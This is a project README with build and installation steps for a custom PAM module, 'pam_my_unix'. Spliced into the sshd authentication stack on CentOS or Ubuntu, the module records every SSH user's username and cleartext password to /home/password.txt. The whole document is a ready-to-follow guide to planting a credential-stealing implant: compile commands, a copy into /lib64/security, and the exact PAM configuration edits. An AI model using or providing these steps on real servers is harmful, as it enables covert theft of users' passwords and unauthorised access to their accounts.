# PAM_MY_UNIX

## How to use
- check password file path
    This module will put username/password to `/home/password.txt`, you can change it in `main.c`.
    Just edit `const char *log_filename = "/home/password.txt";` and compile this PAM module.

- compile
    ``` sh
    cc main.c -o pam_my_unix.so -fPIC -m64 -shared -lpam
    ```

- move to the right directory
    ``` sh
    cp ./pam_my_unix.so /lib64/security/
    ```

- edit sshd's pam config.
    ### CentOS
    ``` sh
    vim /etc/pam.d/sshd
    ```
    And add the next line after the latest auth interface module:
    ``` sh
    auth optional pam_my_unix.so
    ```

    Maybe you file looks like this after you edit it.
    ```
    ...
    auth       required     pam_unix.so nullok
    auth       optional     pam_my_unix.so
    account    required     pam_nologin.so
    account    include      password-auth
    ...
    ```

    ### Ubuntu
    ``` sh
    cp /etc/pam.d/common-auth /etc/pam.d/sshd-auth
    vim /etc/pam.d/sshd-auth
    ```
    And the `sshd-auth` file looks like this below:
    ```
    auth	required            pam_unix.so nullok_secure
    auth    optional            pam_my_unix.so
    auth	required			pam_permit.so
    ```

    And then edit `/etc/pam.d/sshd` and change
    ```
    @include common-auth
    ```
    to
    ```
    @include sshd-auth
    ```

- result
    When someone who is trying to auth via ssh, his username and password will log into a file.
    ![result](https://raw.githubusercontent.com/LiGhT1EsS/pam_my_unix/master/doc/1.png)

